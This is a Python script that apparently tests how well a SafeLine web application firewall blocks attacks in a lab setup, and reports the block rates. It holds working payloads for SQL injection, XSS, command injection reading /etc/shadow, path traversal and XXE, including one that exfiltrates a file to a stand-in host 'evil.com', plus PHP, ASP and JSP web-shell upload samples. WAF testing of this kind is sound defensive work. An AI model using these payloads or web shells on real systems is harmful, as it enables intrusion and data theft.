#!/usr/bin/env python3

import subprocess
import json
import time
import os
from datetime import datetime

RESULTS_DIR = f"/results/security_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
os.makedirs(RESULTS_DIR, exist_ok=True)

WAF_URL = "http://safeline-tengine"
DIRECT_URL = "http://vulnerable-app"

def log_test(test_name, result):
    """Log test results with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(f"{RESULTS_DIR}/test_log.txt", "a") as f:
        f.write(f"[{timestamp}] {test_name}: {result}\n")
    print(f"[{timestamp}] {test_name}: {result}")

def run_sql_injection_tests():
    """Test SQL injection detection"""
    print("\n=== SQL Injection Tests ===")
    attacks = [
        ("Basic OR injection", "1' OR '1'='1"),
        ("Union Select", "1' UNION SELECT null,table_name FROM information_schema.tables--"),
        ("Drop Table", "1'; DROP TABLE users--"),
        ("Time-based blind", "1' AND SLEEP(5)--"),
        ("Boolean blind", "1' AND 1=1--"),
        ("Error-based", "1' AND extractvalue(1,concat(0x7e,database()))--"),
        ("Stacked queries", "1'; INSERT INTO users VALUES(99,'hacker','password')--"),
        ("Second order", "admin'--"),
        ("Unicode bypass", "1′ OR ′1′=′1"),
        ("Comment bypass", "1'/**/OR/**/1=1--")
    ]
    
    results = []
    for name, payload in attacks:
        # Test through WAF
        response = subprocess.run([
            "curl", "-s", "-w", "\n%{http_code}", 
            f"{WAF_URL}/api/index.php?user={payload}"
        ], capture_output=True, text=True)
        
        status_code = response.stdout.strip().split('\n')[-1]
        blocked = status_code in ["403", "406", "400"]
        
        result = {
            "attack_name": name,
            "payload": payload,
            "status_code": status_code,
            "blocked": blocked
        }
        results.append(result)
        log_test(f"SQL Injection - {name}", "BLOCKED" if blocked else "PASSED")
    
    return results

def run_xss_tests():
    """Test XSS detection"""
    print("\n=== XSS Tests ===")
    attacks = [
        ("Basic script tag", "<script>alert('XSS')</script>"),
        ("IMG tag", "<img src=x onerror=alert('XSS')>"),
        ("SVG tag", "<svg onload=alert('XSS')>"),
        ("Javascript URL", "javascript:alert('XSS')"),
        ("Event handler", "<div onmouseover='alert(1)'>"),
        ("Encoded script", "%3Cscript%3Ealert('XSS')%3C/script%3E"),
        ("Double encoded", "%253Cscript%253Ealert('XSS')%253C/script%253E"),
        ("Case variation", "<ScRiPt>alert('XSS')</sCrIpT>"),
        ("Null byte", "<script\x00>alert('XSS')</script>"),
        ("HTML entity", "&lt;script&gt;alert('XSS')&lt;/script&gt;")
    ]
    
    results = []
    for name, payload in attacks:
        response = subprocess.run([
            "curl", "-s", "-w", "\n%{http_code}", "-X", "POST",
            f"{WAF_URL}/vulnerabilities/index.php",
            "-d", f"name={payload}"
        ], capture_output=True, text=True)
        
        status_code = response.stdout.strip().split('\n')[-1]
        blocked = status_code in ["403", "406", "400"]
        
        result = {
            "attack_name": name,
            "payload": payload,
            "status_code": status_code,
            "blocked": blocked
        }
        results.append(result)
        log_test(f"XSS - {name}", "BLOCKED" if blocked else "PASSED")
    
    return results

def run_command_injection_tests():
    """Test command injection detection"""
    print("\n=== Command Injection Tests ===")
    attacks = [
        ("Basic semicolon", "127.0.0.1; cat /etc/passwd"),
        ("Pipe", "127.0.0.1 | ls -la"),
        ("AND operator", "127.0.0.1 && whoami"),
        ("OR operator", "127.0.0.1 || id"),
        ("Backticks", "127.0.0.1 `cat /etc/shadow`"),
        ("Dollar sign", "127.0.0.1 $(pwd)"),
        ("Newline", "127.0.0.1\ncat /etc/passwd"),
        ("URL encoded", "127.0.0.1%3B%20cat%20/etc/passwd"),
        ("Space bypass", "127.0.0.1;cat</etc/passwd"),
        ("Comment", "127.0.0.1 #' cat /etc/passwd")
    ]
    
    results = []
    for name, payload in attacks:
        response = subprocess.run([
            "curl", "-s", "-w", "\n%{http_code}", "-X", "POST",
            f"{WAF_URL}/api/index.php",
            "-d", f"ping=1&host={payload}"
        ], capture_output=True, text=True)
        
        status_code = response.stdout.strip().split('\n')[-1]
        blocked = status_code in ["403", "406", "400"]
        
        result = {
            "attack_name": name,
            "payload": payload,
            "status_code": status_code,
            "blocked": blocked
        }
        results.append(result)
        log_test(f"Command Injection - {name}", "BLOCKED" if blocked else "PASSED")
    
    return results

def run_path_traversal_tests():
    """Test path traversal detection"""
    print("\n=== Path Traversal Tests ===")
    attacks = [
        ("Basic traversal", "../../../../etc/passwd"),
        ("Encoded dots", "..%2f..%2f..%2f..%2fetc%2fpasswd"),
        ("Double encoded", "..%252f..%252f..%252f..%252fetc%252fpasswd"),
        ("Unicode", "..%c0%af..%c0%af..%c0%afetc/passwd"),
        ("Null byte", "../../../../etc/passwd%00"),
        ("Absolute path", "/etc/passwd"),
        ("Windows path", "..\\..\\..\\..\\windows\\system32\\config\\sam"),
        ("UNC path", "\\\\server\\share\\file"),
        ("Mixed encoding", "..%2f..\\..%2f..\\etc/passwd"),
        ("Long path", "../" * 20 + "etc/passwd")
    ]
    
    results = []
    for name, payload in attacks:
        response = subprocess.run([
            "curl", "-s", "-w", "\n%{http_code}",
            f"{WAF_URL}/vulnerabilities/index.php?page={payload}"
        ], capture_output=True, text=True)
        
        status_code = response.stdout.strip().split('\n')[-1]
        blocked = status_code in ["403", "406", "400"]
        
        result = {
            "attack_name": name,
            "payload": payload,
            "status_code": status_code,
            "blocked": blocked
        }
        results.append(result)
        log_test(f"Path Traversal - {name}", "BLOCKED" if blocked else "PASSED")
    
    return results

def run_xxe_tests():
    """Test XXE injection detection"""
    print("\n=== XXE Injection Tests ===")
    attacks = [
        ("Basic XXE", """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"""),
        ("External DTD", """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>"""),
        ("Parameter entity", """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">%eval;%exfil;]><foo></foo>"""),
        ("Billion laughs", """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>"""),
        ("SSRF via XXE", """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""")
    ]
    
    results = []
    for name, payload in attacks:
        response = subprocess.run([
            "curl", "-s", "-w", "\n%{http_code}", "-X", "POST",
            f"{WAF_URL}/api/index.php",
            "-H", "Content-Type: text/xml",
            "-d", f"xml={payload}"
        ], capture_output=True, text=True)
        
        status_code = response.stdout.strip().split('\n')[-1]
        blocked = status_code in ["403", "406", "400"]
        
        result = {
            "attack_name": name,
            "payload": payload[:50] + "...",  # Truncate for readability
            "status_code": status_code,
            "blocked": blocked
        }
        results.append(result)
        log_test(f"XXE - {name}", "BLOCKED" if blocked else "PASSED")
    
    return results

def run_file_upload_tests():
    """Test malicious file upload detection"""
    print("\n=== File Upload Tests ===")
    
    # Create test files
    test_files = [
        ("webshell.php", "<?php system($_GET['cmd']); ?>"),
        ("shell.php.jpg", "<?php eval($_POST['cmd']); ?>"),
        ("reverse.asp", "<%eval request('cmd')%>"),
        ("backdoor.jsp", "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>"),
        ("eicar.txt", "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"),
        ("malicious.svg", "<svg onload=alert('XSS')></svg>"),
        ("polyglot.jpg", "\xFF\xD8\xFF\xE0<?php phpinfo(); ?>"),
        ("htaccess", "AddType application/x-httpd-php .jpg"),
        ("null_byte.php\x00.jpg", "<?php passthru($_GET['cmd']); ?>"),
        ("double_ext.php.php", "<?php system('id'); ?>")
    ]
    
    results = []
    for filename, content in test_files:
        # Create temporary file
        temp_file = f"/tmp/{filename}"
        with open(temp_file, "w") as f:
            f.write(content)
        
        response = subprocess.run([
            "curl", "-s", "-w", "\n%{http_code}", "-X", "POST",
            f"{WAF_URL}/api/index.php",
            "-F", f"file=@{temp_file}"
        ], capture_output=True, text=True)
        
        status_code = response.stdout.strip().split('\n')[-1]
        blocked = status_code in ["403", "406", "400"]
        
        result = {
            "attack_name": f"Upload {filename}",
            "payload": filename,
            "status_code": status_code,
            "blocked": blocked
        }
        results.append(result)
        log_test(f"File Upload - {filename}", "BLOCKED" if blocked else "PASSED")
        
        # Clean up
        os.remove(temp_file)
    
    return results

def run_protocol_violation_tests():
    """Test protocol violation detection"""
    print("\n=== Protocol Violation Tests ===")
    
    results = []
    
    # Test 1: Malformed HTTP method
    response = subprocess.run([
        "curl", "-s", "-w", "\n%{http_code}", "-X", "MALFORMED",
        f"{WAF_URL}/"
    ], capture_output=True, text=True)
    status_code = response.stdout.strip().split('\n')[-1]
    results.append({
        "attack_name": "Malformed HTTP method",
        "payload": "MALFORMED /",
        "status_code": status_code,
        "blocked": status_code in ["403", "406", "400", "405"]
    })
    
    # Test 2: Oversized headers
    large_header = "X" * 10000
    response = subprocess.run([
        "curl", "-s", "-w", "\n%{http_code}",
        "-H", f"X-Large: {large_header}",
        f"{WAF_URL}/"
    ], capture_output=True, text=True)
    status_code = response.stdout.strip().split('\n')[-1]
    results.append({
        "attack_name": "Oversized header",
        "payload": "Header > 10KB",
        "status_code": status_code,
        "blocked": status_code in ["403", "406", "400", "431"]
    })
    
    # Test 3: Invalid content-length
    response = subprocess.run([
        "curl", "-s", "-w", "\n%{http_code}", "-X", "POST",
        "-H", "Content-Length: -1",
        "-d", "test=data",
        f"{WAF_URL}/"
    ], capture_output=True, text=True)
    status_code = response.stdout.strip().split('\n')[-1]
    results.append({
        "attack_name": "Invalid Content-Length",
        "payload": "Content-Length: -1",
        "status_code": status_code,
        "blocked": status_code in ["403", "406", "400"]
    })
    
    for result in results:
        log_test(f"Protocol Violation - {result['attack_name']}", 
                "BLOCKED" if result['blocked'] else "PASSED")
    
    return results

def generate_report(all_results):
    """Generate comprehensive security test report"""
    total_attacks = sum(len(results) for results in all_results.values())
    blocked_attacks = sum(sum(1 for r in results if r['blocked']) for results in all_results.values())
    detection_rate = (blocked_attacks / total_attacks * 100) if total_attacks > 0 else 0
    
    report = {
        "test_date": datetime.now().isoformat(),
        "summary": {
            "total_attacks": total_attacks,
            "blocked_attacks": blocked_attacks,
            "detection_rate": f"{detection_rate:.1f}%"
        },
        "results_by_category": all_results,
        "category_summary": {}
    }
    
    # Calculate per-category statistics
    for category, results in all_results.items():
        total = len(results)
        blocked = sum(1 for r in results if r['blocked'])
        report["category_summary"][category] = {
            "total": total,
            "blocked": blocked,
            "detection_rate": f"{(blocked/total*100):.1f}%" if total > 0 else "0%"
        }
    
    # Save JSON report
    with open(f"{RESULTS_DIR}/security_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    # Generate HTML report
    html_report = f"""
    <html>
    <head>
        <title>SafeLine WAF Security Test Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .summary {{ background: #f0f0f0; padding: 20px; border-radius: 5px; }}
            .passed {{ color: green; }}
            .failed {{ color: red; }}
            table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #4CAF50; color: white; }}
            tr:nth-child(even) {{ background-color: #f2f2f2; }}
        </style>
    </head>
    <body>
        <h1>SafeLine WAF Security Test Report</h1>
        <div class="summary">
            <h2>Summary</h2>
            <p>Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Total Attacks: {total_attacks}</p>
            <p>Blocked Attacks: {blocked_attacks}</p>
            <p>Overall Detection Rate: <strong>{detection_rate:.1f}%</strong></p>
        </div>
    """
    
    for category, results in all_results.items():
        html_report += f"""
        <h2>{category.replace('_', ' ').title()}</h2>
        <table>
            <tr>
                <th>Attack Name</th>
                <th>Payload</th>
                <th>Status Code</th>
                <th>Result</th>
            </tr>
        """
        for result in results:
            status_class = "passed" if result['blocked'] else "failed"
            status_text = "BLOCKED" if result['blocked'] else "PASSED"
            html_report += f"""
            <tr>
                <td>{result['attack_name']}</td>
                <td><code>{result['payload'][:100]}</code></td>
                <td>{result['status_code']}</td>
                <td class="{status_class}">{status_text}</td>
            </tr>
            """
        html_report += "</table>"
    
    html_report += """
    </body>
    </html>
    """
    
    with open(f"{RESULTS_DIR}/security_report.html", "w") as f:
        f.write(html_report)
    
    return report

def main():
    print("=== SafeLine WAF Security Test Suite ===")
    print(f"Started at: {datetime.now()}")
    print(f"Results directory: {RESULTS_DIR}")
    
    all_results = {
        "sql_injection": run_sql_injection_tests(),
        "xss": run_xss_tests(),
        "command_injection": run_command_injection_tests(),
        "path_traversal": run_path_traversal_tests(),
        "xxe": run_xxe_tests(),
        "file_upload": run_file_upload_tests(),
        "protocol_violation": run_protocol_violation_tests()
    }
    
    report = generate_report(all_results)
    
    print("\n=== Test Summary ===")
    print(f"Total Attacks: {report['summary']['total_attacks']}")
    print(f"Blocked Attacks: {report['summary']['blocked_attacks']}")
    print(f"Overall Detection Rate: {report['summary']['detection_rate']}")
    print("\nPer-Category Results:")
    for category, stats in report['category_summary'].items():
        print(f"  {category}: {stats['blocked']}/{stats['total']} blocked ({stats['detection_rate']})")
    
    print(f"\nReports saved to: {RESULTS_DIR}")
    print(f"Completed at: {datetime.now()}")

if __name__ == "__main__":
    main()